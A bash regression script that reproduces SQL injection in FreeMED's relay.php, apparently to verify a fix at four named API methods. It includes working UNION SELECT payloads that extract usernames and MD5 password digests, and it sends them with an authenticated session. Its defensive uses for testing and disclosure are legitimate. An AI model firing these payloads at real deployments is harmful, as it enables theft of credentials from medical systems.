#!/usr/bin/env bash
#
# repro-relay-sqli.sh - hostile repro for SQL injection through relay.php's JSON transport
#
# relay.php only checks that a user is logged in; the API methods below
# concatenate user input straight into SQL. Four sites were fixed together;
# each is probed SEPARATELY and gets its own verdict, so a clean result for one
# method can never stand in for another:
#
#   lib/org/freemedsoftware/api/UserInterface.class.php:141,144          GetUsers
#     $condition = $condition." AND usertype='".$usertype."' ";
#   lib/org/freemedsoftware/api/ModuleSearch.class.php:35                picklist
#     $q = "module_associations='".$moduleType."' and ";
#   lib/org/freemedsoftware/module/EncounterNotesTemplate.class.php:275  getTemplates
#     ... WHERE pnotesttype='".$type."'"
#   lib/org/freemedsoftware/api/Remitt.class.php:997                     _RenderProcedure
#     ... FROM payrec WHERE payrecproc='".$procedure."'"
#
# Every injected payload appends a UNION SELECT that hands back user.username /
# user.userpassword (an unsalted MD5 digest), which the response must never be
# able to contain.
#
# THE VECTOR (measured, not assumed)
#
# The method goes in PATH_INFO and the parameters are form fields named
# param0..paramN (Relay::extract_parameters() -> `param1 ... paramN` branch):
#
#   POST /relay.php/json/org.freemedsoftware.api.UserInterface.GetUsers
#   Content-Type: application/x-www-form-urlencoded
#   param0=a&param1=x' UNION SELECT username,userpassword FROM user-- -
#
# The JSON-body form (`{"method":...,"params":[...]}`) is NOT usable: it fatals
# on Relay_Json::deserialize_parameters(), which is called at
# Relay_Json.class.php:87 and defined nowhere in the tree, so no injection ever
# runs. Login over relay JSON is fatal for the same reason; obtain a session
# from the deployment's own UI (or, on the verify stack, login-probe.php) and
# hand it to this script.
#
# Usage:
#   RELAY_COOKIE_JAR=/tmp/fm.jar BASE=http://localhost:38081 ./repro-relay-sqli.sh
#
# Environment:
#   BASE                       base URL (default http://localhost:38081)
#   RELAY_COOKIE_JAR           curl cookie jar holding an authenticated session
#   RELAY_SESSION_COOKIE       session cookie VALUE, if you have no jar file
#   RELAY_SESSION_COOKIE_NAME  cookie name for the value above (default SessionID)
#   TIMEOUT                    per-request curl timeout in seconds (default 20)
#
# One of RELAY_COOKIE_JAR / RELAY_SESSION_COOKIE is REQUIRED. This script never
# logs in by itself and contains no credential: it measures the injection, it
# does not establish identity. If neither is supplied it exits 2 with
# instructions instead of reporting a meaningless clean result.
#
# On the FreeMED verify stack (verify-env.md section 5) a session is obtained
# with the stack's own probe:
#   curl -s -c /tmp/fm.jar http://localhost:38081/login-probe.php
#   RELAY_COOKIE_JAR=/tmp/fm.jar BASE=http://localhost:38081 ./repro-relay-sqli.sh
# Any deployment's UI session works the same way - that file is an example, not
# a dependency, and is never used unless you point RELAY_COOKIE_JAR at it.
#
# The cookie value is never passed on a command line (a jar file path is; the
# cookie value is not) and never printed; the request body - including the
# injected payload - is piped to curl on stdin (`--data-binary @-`) so it is not
# visible in ps(1) or /proc/<pid>/cmdline on a shared clinical host.
#
# HOW A RESPONSE IS JUDGED (marker + redaction semantics; every one of these
# branches is implemented in fire() below)
#
#   EXPLOITED      a 32-hex digest in JSON string context next to a username
#                  (the ["<user>","<md5>"] row shape this payload produces), or
#                  two or more bare 32-hex strings in one response, or MySQL
#                  error text returned to the client. Bytes withheld. Exit 1.
#   INCONCLUSIVE   exactly ONE bare 32-hex string and none of the above. A
#                  digest-shaped value did come back: the thresholds above are
#                  what make a digest a leak, so on its own it is not proof - but
#                  it cannot be shown NOT to be a credential either, so the bytes
#                  are WITHHELD and the probe is INCONCLUSIVE. A response that
#                  holds a digest is never reported as "no exploit observed" and
#                  never printed. Exit 2.
#   INCONCLUSIVE   HTTP 200 with a 0-byte body: the method did not dispatch.
#                  relay.php runs the call through @call_user_func_array, so an
#                  internal failure - notably ModuleIndex::GetModuleProperty()
#                  returning null when the `modules` registry has no row for the
#                  class, which makes a module-layer method answer 200 with an
#                  EMPTY body - is swallowed. "No rows" from a method that never
#                  ran is vacuous, so it is never clean. Exit 2.
#   INCONCLUSIVE   PHP fatal, INVALID_SESSION, 5xx, or no response at all; each
#                  prints its own reason. Exit 2.
#   CLEAN          nothing above matched: the response body IS printed verbatim
#                  (that is the measurement) and counts as a measured negative.
#
# A matched/withheld/0-byte response is never printed, not even as an excerpt.
#
# NON-VACUITY: each site is probed three times - a reachability call that must
# return real rows, a benign control that must return the benign answer, and the
# injected call. The reachability call is what distinguishes "the method ran the
# query and the payload did not leak" from "the method never ran": at pre-fix
# state all four methods return rows here and the injected call leaks; on a
# deployment whose `modules`/`entemplate`/`payrec` rows do not exist the
# reachability call returns no rows, which is printed as `>>> WEAKER THAN
# MEASURED` and COUNTED: such a site is NOT listed as cleared, and the run exits
# 2 (deferred item 1 / finding C-2 - before the final fix wave the warning
# incremented nothing, so the site was still filed as cleared and still exited 0).
# The verify stack's rows (recorded in the sibling task 2.2-2.5 report) are:
# modules.module_associations='billing' -> 'Demo Payments Module',
# entemplate id 1 'Demo Progress Template'/'Progress Note',
# payrec id 3 with payrecproc 5 / payrecamt 150.25. Seed them if absent.
#
# Exit codes:
#   0  every site was measured: session authenticated, all calls dispatched, each
#      reachability assertion and each control asserted and matched, no payload
#      leaked
#   1  EXPLOITED - a digest, an unexpected row, or MySQL error text came back
#   2  inconclusive - no session supplied, session not authenticated, a method did
#      not dispatch, a single bare digest came back (withheld), a control did not
#      behave, a reachability assertion printed WEAKER THAN MEASURED (the site is
#      listed as NOT CLEARED), PHP fatal or 5xx, or a request got no response
#
# NO --self-test, and why that is not a gap in this file: the plan mandated a
# --self-test only for the traversal probe (Task 0.1 / ruling R7). This script's
# sensitivity is instead COMMITTED as evidence: the same script run against the
# pre-fix tree prints EXPLOITED with the injected UNION payload, and the run
# against the fixed tree prints a clean negative - both in
# tests/security/evidence/relay-sqli-prefix.txt. The fail-closed exits are what
# keep a negative from being vacuous (no session / not authenticated -> 2, a
# 0-byte 200 -> 2 because the method did not dispatch, exactly one bare 32-hex
# string -> 2 with the bytes withheld), and the per-site verdict logic counts a
# reachability assertion that did not hold as WEAKER THAN MEASURED so the site is
# not cleared. A reader looking for a --self-test here should read that
# transcript instead: there is none to run.
#
# Only `set -u` is used: every request must be attempted even when an earlier
# curl fails.
set -u

BASE="${BASE:-http://localhost:38081}"
TIMEOUT="${TIMEOUT:-20}"
RELAY_COOKIE_JAR="${RELAY_COOKIE_JAR:-}"
RELAY_SESSION_COOKIE="${RELAY_SESSION_COOKIE:-}"
RELAY_SESSION_COOKIE_NAME="${RELAY_SESSION_COOKIE_NAME:-SessionID}"
TMPDIR="${TMPDIR:-/tmp}"

# Methods and payloads. The payloads are the measured ones - each is the value of
# the parameter that reaches the concatenation, with a UNION SELECT appended.
M_LOGGEDIN='org.freemedsoftware.public.Login.LoggedIn'
M_GETUSERS='org.freemedsoftware.api.UserInterface.GetUsers'
M_PICKLIST='org.freemedsoftware.api.ModuleSearch.picklist'
M_TEMPLATES='org.freemedsoftware.module.EncounterNotesTemplate.getTemplates'
M_REMITT='org.freemedsoftware.api.Remitt.RenderStatementXML'
INJ_GETUSERS="x' UNION SELECT username,userpassword FROM user-- -"
INJ_PICKLIST="billing' UNION SELECT userfname,userlname FROM user-- -"
INJ_TEMPLATES="x' UNION SELECT id,username,userpassword,usertype FROM user-- -"
INJ_REMITT="0' UNION SELECT 1,0,0,0,CONCAT(username,':',userpassword) FROM user-- -"

# Response markers.
# A 32-hex digest is the userpassword column. The old unanchored
# `[0-9a-f]{32}` matched ANY 32-hex string anywhere in ANY response, which is a
# false accusation in an advisory's evidence file; a digest now only counts when
# it is a JSON string adjacent to another JSON string (the
# ["<username>","<md5>"] row shape this payload produces), or when there are two
# or more bare 32-hex strings in one response. Exactly one bare match is
# INCONCLUSIVE with the bytes withheld - never clean (see the header).
MD5_JSON_RE='"[^"[:space:]]{1,64}"[[:space:]]*,[[:space:]]*"[0-9a-f]{32}"'
MD5_BARE_RE='[0-9a-f]{32}'
SQLERR_RE='SQL syntax|check the manual that corresponds|mysql_(query|fetch|connect)|Warning: mysqli?|You have an error'
FATAL_RE='Fatal error|Uncaught |Parse error'
SESSION_BAD_RE='INVALID_SESSION'

# Cookie jar. RELAY_COOKIE_JAR is used exactly as given and never rewritten
# (-b only, no -c). A cookie VALUE supplied in the environment is materialised
# into a 0600 temp jar under TMPDIR so it stays out of argv.
JAR=""
JAR_OWNS=0
if [ -n "$RELAY_COOKIE_JAR" ]; then
  if [ ! -r "$RELAY_COOKIE_JAR" ]; then
    printf 'repro: RELAY_COOKIE_JAR=%s is not readable\n' "$RELAY_COOKIE_JAR" >&2
    exit 2
  fi
  JAR="$RELAY_COOKIE_JAR"
elif [ -n "$RELAY_SESSION_COOKIE" ]; then
  if ! JAR="$(mktemp "${TMPDIR%/}/freemed-relay-cookies.XXXXXX")"; then
    printf 'repro: mktemp failed in %s - refusing to fall back to a predictable path\n' "${TMPDIR%/}" >&2
    exit 2
  fi
  JAR_OWNS=1
  hostport="${BASE#*://}"
  hostport="${hostport%%/*}"
  host="${hostport##*@}"
  host="${host%%:*}"
  ( umask 077; printf '%s\tFALSE\t/\tFALSE\t0\t%s\t%s\n' \
      "$host" "$RELAY_SESSION_COOKIE_NAME" "$RELAY_SESSION_COOKIE" >"$JAR" )
else
  cat >&2 <<EOF
repro: INCONCLUSIVE - no relay session supplied, so nothing can be measured.

This script fires an authenticated injection; it does not authenticate. Supply
an authenticated session for the deployment under test in ONE of:

  RELAY_COOKIE_JAR=<path>        a curl cookie jar holding the session cookie
  RELAY_SESSION_COOKIE=<value>   the session cookie value itself
                                 (name via RELAY_SESSION_COOKIE_NAME, default SessionID)

Example - the FreeMED verify stack provides its own login probe (verify-env.md
section 5). Relay JSON login is fatal on PHP 8.3, so use it:

  curl -s -c /tmp/fm.jar http://localhost:38081/login-probe.php
  RELAY_COOKIE_JAR=/tmp/fm.jar BASE=http://localhost:38081 $(basename "$0")

For any other deployment, take the session cookie out of your browser's UI
session (DevTools -> Application -> Cookies) or out of your own login probe.
EOF
  exit 2
fi

if ! OUT="$(mktemp "${TMPDIR%/}/freemed-relay-body.XXXXXX")"; then
  printf 'repro: mktemp failed in %s - refusing to fall back to a predictable path\n' "${TMPDIR%/}" >&2
  exit 2
fi

cleanup() {
  [ -n "${OUT:-}" ] && rm -f "$OUT"
  [ "$JAR_OWNS" = "1" ] && [ -n "$JAR" ] && rm -f "$JAR"
  return 0
}
on_signal() {
  printf '\nrepro: interrupted\n' >&2
  cleanup
  exit 130
}
trap cleanup EXIT
trap on_signal INT TERM HUP

# URL-encode a value for an application/x-www-form-urlencoded body (byte-wise,
# so multibyte input is safe; space becomes %20, which PHP decodes as space).
urlencode() {
  local s="$1" out="" i c hex
  local LC_ALL=C
  for (( i=0; i<${#s}; i++ )); do
    c="${s:i:1}"
    case "$c" in
      [a-zA-Z0-9.~_-]) out="$out$c" ;;
      *)
        printf -v hex '%%%02X' "'$c"
        out="$out$hex"
        ;;
    esac
  done
  printf '%s' "$out"
}

G_PROBES=0
G_EXPLOIT=0
G_INCONCLUSIVE=0
G_HOLD=0     # subset of G_INCONCLUSIVE: single bare digest, bytes withheld
G_EMPTY=0    # subset of G_INCONCLUSIVE: HTTP 200 with a 0-byte body (no dispatch)
G_WEAK=0     # reachability/control assertions that printed WEAKER THAN MEASURED
G_SITES=0    # site_begin() calls (used to derive the progress line, not to label it)
G_PREFLIGHT=0 # fire()s before the first site - the session preflight only

# Per-response state set by fire():
#   R_CODE   HTTP status, "000" when there was no response at all
#   R_BYTES  response size
#   R_CLASS  unreachable | fatal | session | server-error | empty | hold | exploit | clean
#   R_REASON human-readable reason for the non-clean classes
#   R_BODY   the response text, set ONLY for a clean response (redaction rule)
R_CODE=""
R_BYTES=0
R_CLASS=""
R_REASON=""
R_BODY=""

# fire <label> <method> <raw-fields-for-evidence> <encoded-body>
fire() {
  local label="$1" method="$2" desc="$3" body="$4"
  local url code nbytes n reasons matched json_hit sql_hit
  url="$BASE/relay.php/json/$method"
  : >"$OUT"
  G_PROBES=$((G_PROBES + 1))
  R_CODE=""; R_BYTES=0; R_CLASS="clean"; R_REASON=""; R_BODY=""

  # The body (which carries the injected payload) goes in on stdin: never argv.
  code="$(printf '%s' "$body" | curl -s --max-time "$TIMEOUT" -o "$OUT" \
    -b "$JAR" -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-binary @- -w '%{http_code}' "$url" 2>/dev/null)"
  code="${code:-000}"

  printf -- '--- %s\n' "$label"
  printf '    POST %s\n' "$url"
  printf '    fields as sent (URL-encoded on the wire):\n'
  printf '      %s\n' "$desc"
  printf '    request body as sent: %s\n' "$body"

  if [ "$code" = "000" ]; then
    R_CODE="000"; R_CLASS="unreachable"; R_REASON="no response (connection refused / timed out)"
    G_INCONCLUSIVE=$((G_INCONCLUSIVE + 1))
    printf '    HTTP 000  UNREACHABLE: no response (connection refused / timed out)\n\n'
    return 0
  fi
  R_CODE="$code"
  nbytes="$(wc -c <"$OUT" | tr -d ' ')"
  R_BYTES="$nbytes"
  printf '    HTTP %s  bytes=%s\n' "$code" "$nbytes"

  if grep -qE "$FATAL_RE" "$OUT"; then
    R_CLASS="fatal"; R_REASON="PHP fatal in the response - the request never reached the query"
    G_INCONCLUSIVE=$((G_INCONCLUSIVE + 1))
    printf '    >>> INCONCLUSIVE: %s\n' "$R_REASON"
    printf '    body(%s bytes, first line): %s\n\n' "$nbytes" "$(head -n 1 "$OUT" | head -c 160 | tr '\n\r' '  ')"
    return 0
  fi
  if grep -qE "$SESSION_BAD_RE" "$OUT"; then
    R_CLASS="session"; R_REASON="relay answered $SESSION_BAD_RE - the session is not authenticated"
    G_INCONCLUSIVE=$((G_INCONCLUSIVE + 1))
    printf '    >>> INCONCLUSIVE: relay answered %s - the session is not authenticated,\n' "$SESSION_BAD_RE"
    printf '    so a clean result here would be meaningless (this is NOT "unreachable").\n\n'
    return 0
  fi
  case "$code" in
    5*)
      R_CLASS="server-error"; R_REASON="server error (HTTP $code)"
      G_INCONCLUSIVE=$((G_INCONCLUSIVE + 1))
      printf '    >>> INCONCLUSIVE: server error (HTTP %s); nothing was measured\n\n' "$code"
      return 0
      ;;
  esac

  # Dispatch assertion: relay.php answers 200 with an EMPTY body when the call
  # never ran, so an empty body can never be a clean measurement.
  if [ "$nbytes" -eq 0 ]; then
    R_CLASS="empty"
    R_REASON="HTTP $code with a 0-byte body - the method did not dispatch"
    G_INCONCLUSIVE=$((G_INCONCLUSIVE + 1))
    G_EMPTY=$((G_EMPTY + 1))
    printf '    >>> INCONCLUSIVE: HTTP %s with a 0-byte body, so the method did not dispatch.\n' "$code"
    printf '    relay.php swallows an internal failure (@call_user_func_array with a null\n'
    printf '    result): for a module-layer method that is what a missing `modules` registry\n'
    printf '    row looks like (ModuleIndex returns null and the module code never runs).\n'
    printf '    "No rows" from a method that did not run is vacuous - NOT a clean result.\n'
    printf '    Seed the registry row (modules.module_class=<class>) and re-run.\n\n'
    return 0
  fi

  json_hit=0; sql_hit=0; matched=0; reasons=""
  if grep -qE "$MD5_JSON_RE" "$OUT"; then
    json_hit=1
    matched=1
    reasons="32-hex MD5 digest in JSON string context next to a username"
  fi
  n="$(grep -oE "$MD5_BARE_RE" "$OUT" 2>/dev/null | wc -l | tr -d ' ')"
  if [ "$n" -ge 2 ]; then
    matched=1
    reasons="${reasons:+$reasons; }$n bare 32-hex strings in one response"
  fi
  if grep -qE "$SQLERR_RE" "$OUT"; then
    sql_hit=1
    matched=1
    reasons="${reasons:+$reasons; }MySQL error text returned to the client"
  fi

  if [ "$matched" -eq 1 ]; then
    R_CLASS="exploit"; R_REASON="$reasons"
    G_EXPLOIT=$((G_EXPLOIT + 1))
    printf '    >>> EXPLOITED: %s\n' "$reasons"
    printf '    body(%s bytes): WITHHELD - a leak marker matched, so no response bytes are printed\n' "$nbytes"
    printf '    (the userpassword digests and any row data are deliberately not written here)\n\n'
    return 0
  fi

  # Exactly one bare 32-hex string and no other marker: a digest-shaped value came
  # back with no username context. Not proof of a leak, not evidence of safety
  # either - the bytes are withheld and the probe is INCONCLUSIVE.
  if [ "$n" -eq 1 ] && [ "$json_hit" -eq 0 ] && [ "$sql_hit" -eq 0 ]; then
    R_CLASS="hold"
    R_REASON="exactly one bare 32-hex string with no JSON username context"
    G_INCONCLUSIVE=$((G_INCONCLUSIVE + 1))
    G_HOLD=$((G_HOLD + 1))
    printf '    >>> INCONCLUSIVE: %s\n' "$R_REASON"
    printf '    A single bare digest is below the two-match / JSON-context thresholds, so it\n'
    printf '    is not called a leak - and it cannot be shown not to be a credential (the\n'
    printf '    userpassword column IS a 32-hex MD5 digest). The response bytes are therefore\n'
    printf '    WITHHELD and this probe is never reported as "no exploit observed":\n'
    printf '    body(%s bytes): WITHHELD - a digest-shaped value came back, so no response bytes\n' "$nbytes"
    printf '    are printed.\n\n'
    return 0
  fi

  R_CLASS="clean"
  R_BODY="$(tr -d '\r' <"$OUT")"
  printf '    body(no leak marker matched, excerpt as received): %s\n' \
    "$(head -c 200 "$OUT" | tr '\n\r' '  ')"
  printf '    no leak marker in this response\n\n'
  return 0
}

# ---- per-site bookkeeping ---------------------------------------------------

SITES_EXPLOITED=()
SITES_INCONCLUSIVE=()
SITES_WEAK=()
SITES_CLEAN=()
S_E0=0
S_I0=0
S_W0=0

site_begin() {
  printf '\n== site: %s ==\n' "$1"
  S_E0="$G_EXPLOIT"
  S_I0="$G_INCONCLUSIVE"
  S_W0="$G_WEAK"
  G_SITES=$((G_SITES + 1))
}

# assert exact body of the previous (clean) response
assert_body() { # <desc> <expected-exact-body>
  local desc="$1" want="$2"
  if [ "$R_CLASS" != "clean" ]; then
    printf '    note: control NOT asserted - its call was %s (%s)\n' "$R_CLASS" "$R_REASON"
    return 0
  fi
  if [ "$R_BODY" = "$want" ]; then
    printf '    control asserted: %s returned exactly %s\n' "$desc" "$want"
  else
    printf '    >>> INCONCLUSIVE: %s returned %s, not the expected %s.\n' "$desc" "${R_BODY:0:80}" "$want"
    printf '    A control that does not answer as modelled means this run cannot tell "the\n'
    printf '    payload was neutralised" from "this endpoint behaves differently here".\n'
    G_INCONCLUSIVE=$((G_INCONCLUSIVE + 1))
  fi
}

# assert a substring in the previous (clean) response body.
# A MISS here is not a pass and not a second kind of "no evidence": it is the
# per-site reachability/control assertion failing, which makes this site's
# negative WEAKER THAN MEASURED. It bumps G_WEAK so site_end() and the exit code
# see it - before the final fix wave it printed the warning and incremented
# nothing, so the site was still filed in SITES_CLEAN and still passed.
assert_has() { # <desc> <needle>
  if [ "$R_CLASS" != "clean" ]; then
    printf '    note: assertion skipped - its call was %s (%s)\n' "$R_CLASS" "$R_REASON"
    return 0
  fi
  if printf '%s' "$R_BODY" | grep -qF -- "$2"; then
    printf '    asserted: %s contains %s\n' "$1" "$2"
  else
    printf '    >>> WEAKER THAN MEASURED: %s does not contain %s\n' "$1" "$2"
    printf '    (this deployment does not hold the row the reachability call asks for, so the\n'
    printf '     negative for this site rests on the dispatch evidence alone)\n'
    G_WEAK=$((G_WEAK + 1))
  fi
}

# assert the previous (clean) response does NOT contain a substring
assert_lacks() { # <desc> <needle>
  if [ "$R_CLASS" != "clean" ]; then
    printf '    note: assertion skipped - its call was %s (%s)\n' "$R_CLASS" "$R_REASON"
    return 0
  fi
  if printf '%s' "$R_BODY" | grep -qF -- "$2"; then
    printf '    >>> INCONCLUSIVE: %s unexpectedly contains %s\n' "$1" "$2"
    G_INCONCLUSIVE=$((G_INCONCLUSIVE + 1))
  else
    printf '    asserted: %s does not contain %s\n' "$1" "$2"
  fi
}

# reachability evidence note (never aborts the site's verdict)
reach_note() { # <desc>
  local d="$1"
  case "$R_CLASS" in
    clean)
      printf '    dispatch evidence: %s returned a non-empty body (%s bytes): %s\n' \
        "$d" "$R_BYTES" "$(printf '%s' "$R_BODY" | head -c 120 | tr '\n\r' '  ')"
      ;;
    *)
      printf '    dispatch evidence: %s -> %s (%s)\n' "$d" "$R_CLASS" "$R_REASON"
      ;;
  esac
}

site_end() { # <site-label>
  local name="$1" se si sw
  se=$((G_EXPLOIT - S_E0))
  si=$((G_INCONCLUSIVE - S_I0))
  sw=$((G_WEAK - S_W0))
  if [ "$se" -gt 0 ]; then
    printf '\n    >>> SITE VERDICT [%s]: EXPLOITED - %s of 3 response(s) carried a leak marker\n' "$name" "$se"
    SITES_EXPLOITED=("${SITES_EXPLOITED[@]}" "$name")
  elif [ "$si" -gt 0 ]; then
    printf '\n    >>> SITE VERDICT [%s]: INCONCLUSIVE - %s of 3 response(s) produced no usable evidence, so this site is NOT cleared\n' "$name" "$si"
    SITES_INCONCLUSIVE=("${SITES_INCONCLUSIVE[@]}" "$name")
  elif [ "$sw" -gt 0 ]; then
    # Deferred item 1 / finding C-2: a site whose reachability assertion printed
    # WEAKER THAN MEASURED is NOT a measured negative, so it is not "cleared"
    # and it does not pass the exit code.
    printf '\n    >>> SITE VERDICT [%s]: NOT CLEARED - WEAKER THAN MEASURED: no exploit and no leak marker, but %s reachability assertion(s) did not hold, so this site negative is NOT a measured one\n' "$name" "$sw"
    SITES_WEAK=("${SITES_WEAK[@]}" "$name")
  else
    printf '\n    >>> SITE VERDICT [%s]: NO EXPLOIT OBSERVED for this method - all 3 calls dispatched, the control answered as modelled and the injected call returned no digest, no unexpected row and no MySQL error text\n' "$name"
    SITES_CLEAN=("${SITES_CLEAN[@]}" "$name")
  fi
}

printf 'repro: relay.php JSON-transport SQL injection (param0..paramN form fields, method in PATH_INFO)\n'
printf 'base=%s  session=%s  timeout=%ss\n' "$BASE" \
  "$([ -n "$RELAY_COOKIE_JAR" ] && printf 'cookie jar %s (cookie value never printed)' "$RELAY_COOKIE_JAR" || printf 'RELAY_SESSION_COOKIE value (never printed; jar in TMPDIR)')" \
  "$TIMEOUT"
printf 'note: a response body is printed only when NO leak marker matched it AND it is\n'
printf '      not a single bare 32-hex digest: a matched body, a withheld single digest\n'
printf '      and a 0-byte response (method did not dispatch) are never printed.\n'
printf 'note: 4 fixed sites are probed separately, each with its own verdict.\n\n'

# ---------------------------------------------------------------------------
# 1. Session preflight. LoggedIn is in the public namespace, so it answers with
#    or without a session ('true' / 'false'); it never runs an injection.
# ---------------------------------------------------------------------------
printf '== session preflight ==\n'
fire "org.freemedsoftware.public.Login.LoggedIn (session assertion)" \
  "$M_LOGGEDIN" \
  "(no parameters)" ""
if [ "$R_CLASS" != "clean" ] || [ "$R_BODY" != "true" ]; then
  printf '>>> RESULT: INCONCLUSIVE - Login.LoggedIn() did not answer "true" (got %s: %s), so the\n' \
    "$R_CLASS" "${R_REASON:-no usable answer}"
  printf '    supplied session is not authenticated and a clean injection result below would\n'
  printf '    be meaningless. Obtain a fresh session (see the header) and re-run.\n'
  exit 2
fi
# Everything fired so far is the session preflight (one fire); site_begin() below
# records the first site. Kept as a counter so the closing progress line can be
# derived rather than labelled (deferred item 7).
G_PREFLIGHT="$G_PROBES"

# ---------------------------------------------------------------------------
# 2. Site: UserInterface::GetUsers  (param1 = $usertype, concatenated raw)
# ---------------------------------------------------------------------------
site_begin "$M_GETUSERS"
printf -- '--- reachability: no filters, must return the user rows the query can find\n'
fire "org.freemedsoftware.api.UserInterface.GetUsers (reachability)" \
  "$M_GETUSERS" "param0=''  param1='' (no filters)" "param0=&param1="
assert_has "the reachability response (a row-bearing JSON array)" '[["'
reach_note "GetUsers with no filters"

printf -- '--- benign control: a literal that must select nothing\n'
fire "org.freemedsoftware.api.UserInterface.GetUsers (benign control)" \
  "$M_GETUSERS" "param0='a'  param1='x'" \
  "param0=$(urlencode 'a')&param1=$(urlencode 'x')"
assert_body "GetUsers control param0='a' param1='x'" "null"

printf -- '--- injection: param1 = the $usertype filter (concatenated raw)\n'
fire "org.freemedsoftware.api.UserInterface.GetUsers (injection)" \
  "$M_GETUSERS" "param0='a'  param1=\"$INJ_GETUSERS\"" \
  "param0=$(urlencode 'a')&param1=$(urlencode "$INJ_GETUSERS")"
site_end "$M_GETUSERS"

# ---------------------------------------------------------------------------
# 3. Site: ModuleSearch::picklist  (param1 = $moduleType, concatenated raw)
# ---------------------------------------------------------------------------
site_begin "$M_PICKLIST"
printf -- '--- reachability: the seeded association, must return its module row\n'
fire "org.freemedsoftware.api.ModuleSearch.picklist (reachability)" \
  "$M_PICKLIST" "param0='Demo'  param1='billing'" \
  "param0=$(urlencode 'Demo')&param1=$(urlencode 'billing')"
assert_has "the reachability response" 'DemoPayments'
reach_note "picklist module_associations='billing'"

printf -- '--- benign control: an association that matches no module row\n'
fire "org.freemedsoftware.api.ModuleSearch.picklist (benign control)" \
  "$M_PICKLIST" "param0='Demo'  param1='nonexistent'" \
  "param0=$(urlencode 'Demo')&param1=$(urlencode 'nonexistent')"
assert_body "picklist control param1='nonexistent'" "null"

printf -- '--- injection: param1 = the $moduleType filter (concatenated raw)\n'
fire "org.freemedsoftware.api.ModuleSearch.picklist (injection)" \
  "$M_PICKLIST" "param0='Demo'  param1=\"$INJ_PICKLIST\"" \
  "param0=$(urlencode 'Demo')&param1=$(urlencode "$INJ_PICKLIST")"
site_end "$M_PICKLIST"

# ---------------------------------------------------------------------------
# 4. Site: EncounterNotesTemplate::getTemplates  (param0 = $type, concatenated raw)
#    Module-layer method: an empty body here means the `modules` registry has no
#    row for module_class='EncounterNotesTemplate' and the call never dispatched.
# ---------------------------------------------------------------------------
site_begin "$M_TEMPLATES"
printf -- '--- reachability: the seeded template type, must return its entemplate row\n'
fire "org.freemedsoftware.module.EncounterNotesTemplate.getTemplates (reachability)" \
  "$M_TEMPLATES" "param0='Progress Note'" \
  "param0=$(urlencode 'Progress Note')"
assert_has "the reachability response" '"tempname"'
reach_note "getTemplates pnotesttype='Progress Note'"

printf -- '--- benign control: a type that matches no entemplate row\n'
fire "org.freemedsoftware.module.EncounterNotesTemplate.getTemplates (benign control)" \
  "$M_TEMPLATES" "param0='Encounter Note'" \
  "param0=$(urlencode 'Encounter Note')"
assert_body "getTemplates control param0='Encounter Note'" "[]"

printf -- '--- injection: param0 = $type (pnotesttype), concatenated raw\n'
fire "org.freemedsoftware.module.EncounterNotesTemplate.getTemplates (injection)" \
  "$M_TEMPLATES" "param0=\"$INJ_TEMPLATES\"" \
  "param0=$(urlencode "$INJ_TEMPLATES")"
site_end "$M_TEMPLATES"

# ---------------------------------------------------------------------------
# 5. Site: Remitt::_RenderProcedure, reached through RenderStatementXML
#    (param0 = a procedure key that lands in WHERE payrecproc='<key>').
#    The render path always emits a <payhistory> line, so that line is the
#    dispatch evidence; the seeded payrec row is the row-level evidence.
# ---------------------------------------------------------------------------
site_begin "$M_REMITT"
printf -- '--- reachability: the seeded payrec row, must render its payment\n'
fire "org.freemedsoftware.api.Remitt.RenderStatementXML (reachability)" \
  "$M_REMITT" "param0='5' (payrec row id 3, payrecproc 5)" \
  "param0=$(urlencode '5')"
assert_has "the reachability response" '<patpay>150.25'
reach_note "RenderStatementXML param0='5'"

printf -- '--- benign control: a procedure key with no payrec row\n'
fire "org.freemedsoftware.api.Remitt.RenderStatementXML (benign control)" \
  "$M_REMITT" "param0='6' (no payrec row)" \
  "param0=$(urlencode '6')"
# The XML comes back JSON-escaped by the relay (`<patpay>0<\/patpay>`), so the
# needles below stop before the closing tag.
assert_has "the control response" '<patpay>0'
assert_has "the control response" 'No payment has been received'
assert_lacks "the control response" 'Paid By: Patient'

printf -- '--- injection: param0 = $procedure, concatenated raw into WHERE payrecproc=\n'
fire "org.freemedsoftware.api.Remitt.RenderStatementXML (injection)" \
  "$M_REMITT" "param0=\"$INJ_REMITT\"" \
  "param0=$(urlencode "$INJ_REMITT")"
# The render path emits the pay-history line for every procedure key, so its
# presence proves _RenderProcedure ran its query for the injected key.
assert_has "the injected call's response" '<payhistory>'
printf '    (the injected key is echoed back by the caller inside <procedure id="...">;\n'
printf '     that is this script own input, not data read from the database)\n'
site_end "$M_REMITT"

# ---------------------------------------------------------------------------
# 6. Verdict.
# ---------------------------------------------------------------------------
# The probe/site arithmetic is DERIVED from the counters, not a label: G_SITES is
# the site_begin() count, G_PREFLIGHT is the fire() count at the first site, and
# the per-site figure is the remainder divided by the site count. The previous
# revision printed a fixed "(4 sites x 3)" beside the live counter - 12 where
# G_PROBES said 13, because the preflight is also a fire (deferred item 7).
site_probes=$((G_PROBES - G_PREFLIGHT))
if [ "$G_SITES" -gt 0 ]; then per_site=$((site_probes / G_SITES)); else per_site=0; fi
printf '\n%s probe(s) sent (%s session preflight + %s across %s site(s) x %s), %s vulnerable response(s), %s inconclusive (%s withheld single digest, %s did not dispatch), %s weaker than measured\n' \
  "$G_PROBES" "$G_PREFLIGHT" "$site_probes" "$G_SITES" "$per_site" \
  "$G_EXPLOIT" "$G_INCONCLUSIVE" "$G_HOLD" "$G_EMPTY" "$G_WEAK"
printf 'sites cleared: %s\n' "${SITES_CLEAN[*]:-<none>}"
printf 'sites not cleared (no usable evidence): %s\n' "${SITES_INCONCLUSIVE[*]:-<none>}"
printf 'sites not cleared (weaker than measured): %s\n' "${SITES_WEAK[*]:-<none>}"

if [ "$G_EXPLOIT" -gt 0 ]; then
  printf '>>> RESULT: EXPLOITED - %s relay response(s) leaked a digest, row data or error text (sites: %s)\n' \
    "$G_EXPLOIT" "${SITES_EXPLOITED[*]}"
  exit 1
fi
if [ "$G_INCONCLUSIVE" -gt 0 ] || [ "$G_WEAK" -gt 0 ]; then
  printf '>>> RESULT: INCONCLUSIVE - %s request(s) produced no usable evidence and %s reachability\n' \
    "$G_INCONCLUSIVE" "$G_WEAK"
  printf '    assertion(s) did not hold, so nothing was proven\n'
  printf '    Sites NOT cleared (no usable evidence): %s\n' "${SITES_INCONCLUSIVE[*]:-<none>}"
  printf '    Sites NOT cleared (weaker than measured): %s\n' "${SITES_WEAK[*]:-<none>}"
  printf '    Sites with a measured negative: %s\n' "${SITES_CLEAN[*]:-<none>}"
  exit 2
fi
